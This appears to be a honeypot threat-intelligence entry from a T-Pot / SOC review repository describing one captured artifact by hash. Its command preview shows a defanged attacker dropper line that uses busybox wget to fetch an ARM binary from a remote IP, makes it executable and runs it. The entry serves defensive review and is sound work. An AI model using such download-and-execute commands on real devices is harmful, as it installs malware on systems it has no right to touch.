# a7aa8ae207287377e68c266e15cd415dcfefc4a9844c7c235ac02af7ef267ed5

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `a7aa8ae207287377e68c266e15cd415dcfefc4a9844c7c235ac02af7ef267ed5` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
busybox wget hxxp://141[.]11[.]88[.]XXX/bins/vcimanagement.arm; chmod 777 vcimanagement.arm; ./vcimanagement.arm android
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
